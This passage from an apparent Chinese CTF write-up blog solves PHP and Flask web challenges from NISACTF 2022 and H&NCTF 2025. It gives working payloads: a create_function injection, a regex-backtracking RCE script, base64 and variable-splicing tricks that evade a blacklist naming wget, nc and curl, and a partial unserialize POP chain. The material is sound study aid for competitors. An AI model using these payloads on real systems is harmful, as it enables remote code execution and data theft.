class="string">&#x27;./2.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250630102200333.png" class="" title="image-20250630102200333"><p>进入第三关：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 3</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 3 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sha1强碰撞，<a href="https://github.com/mythkiven/SHAttered">在这里</a>下载2个pdf文件，其前320个字符sha1编码后，还是相等的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_file</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">320</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">read_file</span>(<span class="string">&quot;./1.pdf&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">read_file</span>(<span class="string">&quot;./2.pdf&quot;</span>);</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250630102622086.png" class="" title="image-20250630102622086"><p>进入第4关：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is last level</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$level5</span>); <span class="comment"># 只需要这一步出来就好</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>php的字符串解析特性：空格  _ . 被过滤了，我们可以使用+，+号也可以被转换为下划线。</p><img src="/CTFwp/NISACTF-2022/image-20250630103103121.png" class="" title="image-20250630103103121"><p>进入第五关：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们只需要让$a不以数字字母下划线开头就可以。</p><p><strong>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。</strong><br><strong>调用一个函数时直接写函数名function_name()，相当于是相对路径调用； 如写某一全局函数的完全限定名称\function_name()调用，则是写了一个绝对路径。</strong></p><p><code>$a=\create_function&amp;$b=&#125;system(&#39;cat /f*&#39;)/*</code></p><img src="/CTFwp/NISACTF-2022/image-20250630112215449.png" class="" title="image-20250630112215449"><h2 id="middlerce"><a href="#middlerce" class="headerlink" title="middlerce"></a>middlerce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说一说这个匹配模式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m</span><br><span class="line">^.* 开头匹配任意字符0次或多次</span><br><span class="line">() 子组 \w 匹配[a-z]、[A-Z]、[0-9]、_  ^ * ( ~ ` ? / 空格 | &amp; ! &lt; &gt; &#123; x09 x0a [</span><br><span class="line">.*$ 末尾匹配任意字符0次或多次</span><br></pre></td></tr></table></figure><p>就这个匹配模式来说，php的正则引擎有很大的发挥空间，如果我们输入超过1000000个字符，^.*就可以将这1000000多个字符匹配完，匹配完以后发现后面的模式没有匹配的东西，就会开始进行回溯，每次回溯先吐出一个字符，然后进行匹配，由于我们输入了1000000多个字符，进行回溯的次数肯定超过了1000000次，preg_match就会返回false。</p><p>json_decode是用于json格式的解码，所以我们要传递json格式的数据，键为cmd。</p><p>&#x2F; 被过滤了，所以这里使用<code>?&gt;&lt;?= ?&gt;</code>，避免后面的字符报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28934/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^ * ( ~ ` ? /  | &amp; ! &lt; &gt; &#123; [</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`strings /f*`;?&gt;&#x27;</span>+<span class="string">&#x27;%&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;letter&#x27;</span> : payload</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250630190736453.png" class="" title="image-20250630190736453"><h2 id="is-secret"><a href="#is-secret" class="headerlink" title="is secret"></a>is secret</h2><p>dirsearch扫描的太慢了，就自己试了试别的目录。</p><p>发现有&#x2F;secret目录，通过secret传参出现了报错，猜测开启了debug，又看了一下版本，发现是python2.7.18，一个思路就是flask算pin，还有另一个思路就是下图：</p><img src="/CTFwp/NISACTF-2022/image-20250707075838812.png" class="" title="image-20250707075838812"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#设置密钥 HereIsTreasure</span></span><br><span class="line">deS=rc.do_crypt(secret) <span class="comment"># RC4 加密</span></span><br></pre></td></tr></table></figure><p>最后再进行render_template_string渲染，可以进行ssti模板注入。</p><p>RC4加密是对称加密，即2次加密后就是原始数据。</p><p>1 -&gt; d:</p><img src="/CTFwp/NISACTF-2022/image-20250707080250151.png" class="" title="image-20250707080250151"><p>d -&gt; 1:</p><img src="/CTFwp/NISACTF-2022/image-20250707080307115.png" class="" title="image-20250707080307115"><p>接下来进行ssti注入：</p><img src="/CTFwp/NISACTF-2022/image-20250707080215276.png" class="" title="image-20250707080215276"><p> 拿flag：<img src="/CTFwp/NISACTF-2022/image-20250707080348400.png" class="" title="image-20250707080348400"></p><p>flask算pin，我并没有尝试，我也不知道行不行。</p><p>开启了debug，报错可能会泄露出来一些源码。</p>]]></content>
      
      
      <categories>
          
          <category> CTFwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;NCTF 2025</title>
      <link href="/CTFwp/H&amp;NCTF-2025/"/>
      <url>/CTFwp/H&amp;NCTF-2025/</url>
      
        <content type="html"><![CDATA[<h2 id="Really-Ez-Rce"><a href="#Really-Ez-Rce" class="headerlink" title="Really_Ez_Rce"></a>Really_Ez_Rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$inputNumber</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123; <span class="comment">// \d 表示数字</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123; <span class="comment">// 考察数组绕过，如果参数为数组，intval转化为1</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                <span class="string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,</span><br><span class="line">                <span class="variable">$cmd</span></span><br><span class="line">            )) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;nonono,hacker!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 命令执行这里过滤的是关键字，可以通过拼接的方式绕过</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a=bas;b=e64;c=s;d=h;<span class="built_in">echo</span> bHM=|$a<span class="variable">$b</span> -d|$c<span class="variable">$d</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#index.php</span></span><br><span class="line"></span><br><span class="line">a=bas;b=e64;c=s;d=h;<span class="built_in">echo</span> bHMgLw==|$a<span class="variable">$b</span> -d|$c<span class="variable">$d</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span></span><br><span class="line"></span><br><span class="line">a=bas;b=e64;c=s;d=h;<span class="built_in">echo</span> Y2F0IC9mKg==|$a<span class="variable">$b</span> -d|$c<span class="variable">$d</span></span><br><span class="line"></span><br><span class="line">You win!!! flag&#123;a3d1c4b1-b794-4599-8589-132129672d37&#125;</span><br><span class="line"><span class="comment"># 通过拼接，加base64编码绕过</span></span><br></pre></td></tr></table></figure><p>方法2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;c=/;$a<span class="variable">$b</span> <span class="variable">$c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span></span><br><span class="line"></span><br><span class="line">a=l;b=s;c=/;d=gre;e=p;$a<span class="variable">$b</span> <span class="variable">$c</span>|$d<span class="variable">$e</span> fl</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag.txt 构造出来flag.txt,将其赋值给f变量</span></span><br><span class="line"></span><br><span class="line">a=l;b=s;c=/;d=gre;e=p;f=$($a<span class="variable">$b</span> <span class="variable">$c</span>|$d<span class="variable">$e</span> fl);rev $c<span class="variable">$f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&#125;73d276921231-9858-9954-497b-1b4c1d3a&#123;galf !!!niw uoY</span></span><br><span class="line"><span class="comment">#$()在里面起着重要作用;执行命令，并将结果捕获出来赋值给f</span></span><br></pre></td></tr></table></figure><p>方法3：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ls -a 里面有. ，通过head -n 1,截取出.。</span></span><br><span class="line">a=l;b=s;c=hea;d=d;e=$($a<span class="variable">$b</span> -a|$c<span class="variable">$d</span> -n 1);<span class="built_in">echo</span> <span class="variable">$e</span>;</span><br><span class="line"><span class="comment"># .</span></span><br><span class="line">a=l;b=s;c=hea;d=d;e=$($a<span class="variable">$b</span> -a|$c<span class="variable">$d</span> -n 1);f=fla;g=g;h=tx;i=t;j=/;rev $j$f$g$e$h<span class="variable">$i</span></span><br><span class="line"><span class="comment"># &#125;73d276921231-9858-9954-497b-1b4c1d3a&#123;galf !!!niw uoY</span></span><br></pre></td></tr></table></figure><p>方法4：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="comment">#查看环境变量</span></span><br><span class="line"><span class="variable">$KUBERNETES_SERVICE_HOST</span> <span class="comment">#含有点</span></span><br><span class="line"><span class="comment"># expr substr &quot;字符串&quot; 起始位置 长度        截取.</span></span><br><span class="line"><span class="comment"># $(expr substr $KUBERNETES_SERVICE_HOST 3 1) .</span></span><br><span class="line"><span class="comment"># 剩下的与上面相同</span></span><br></pre></td></tr></table></figure><h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dengchao</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="variable language_">$this</span>-&gt;dengchao; <span class="comment">// 这里可以用于触发__toString 3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Dagongren</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Bagongren</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;Dagongren != <span class="variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Dagongren) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Dagongren)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Bagongren)) )&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;dao, [<span class="string">&#x27;诗人我吃！&#x27;</span>]); <span class="comment">//call_user_func_array与call_user_func一样，当遇到数组是，数组的第一个值会被当做类，第二个值会被当做函数。 2</span></span><br><span class="line"><span class="comment">// 这里并没有限制类型，可以通过数组绕过md5，sha1。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]); <span class="comment">// 这里进行命令执行  1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;What do you want to do?&#x27;</span>); <span class="comment">// gc回收机制</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dengchao</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Dagongren</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Bagongren</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hcf</span> = <span class="keyword">new</span> <span class="title class_">HeiCaFei</span>();</span><br><span class="line"><span class="variable">$hcf</span> -&gt; HongCaFei = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">DouBao</span>();</span><br><span class="line"><span class="variable">$db</span> -&gt; Dagongren[] = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$db</span> -&gt; Bagongren[] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$db</span> -&gt; dao = <span class="keyword">array</span>(<span class="variable">$hcf</span>,<span class="string">&#x27;ls&#x27;</span>); <span class="comment">// $hct -&gt; ls(),$hcf并没有ls方法，这样就触发了__call__</span></span><br><span class="line"><span class="variable">$ggg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">GOGOGO</span>();</span><br><span class="line"><span class="variable">$ggg</span> -&gt; dengchao = <span class="variable">$db</span>;</span><br><span class="line"><span 